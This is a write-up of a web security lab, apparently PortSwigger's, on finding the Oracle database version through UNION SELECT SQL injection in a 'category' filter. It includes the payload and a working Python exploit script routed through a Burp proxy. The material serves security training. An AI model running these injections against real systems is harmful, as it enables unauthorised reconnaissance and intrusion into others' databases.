## SQL injection attack, querying the database type and version on Oracle

<div style="text-align: justify;">
  In this lab, I learned how SQL injection can be leveraged not just for login bypass or data leaks, but for critical recon such as identifying the target database type and version. Using a UNION SELECT injection on an Oracle backend, I was able to extract data from the `v$version` view. Knowing the exact DBMS and version is valuable during real-world exploitation, as it informs which payloads and techniques are likely to succeed.

  The vulnerable parameter was found in the `category` filter, which accepted user input unsafely. Crafting a payload to select from `v$version` revealed the Oracle database version, confirming the injection point and enabling further targeted testing.

  Start Burp Suite before running the script â€” it uses a proxy for visibility.

### How Exploit Works
- The input in the `category` parameter is injectable.
- A **UNION SELECT** statement is used to retrieve DB banner/version.
- Oracle's `v$version` view is targeted to reveal backend info.
- Script looks for a success message (e.g., "Congratulations") in the response.
- This indicates that the injected query was executed and returned data.

### Usage

```cmd
python3 exploit.py https://<your-lab-id>.web-security-academy.net
```

### Exploit

```python title="exploit.py"
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Congratulations" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'UNION+SELECT+BANNER,BANNER+FROM+v$version--"
    except IndexError:
        print("[-] Usage: %s <url>" %sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
        
    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful")        
```
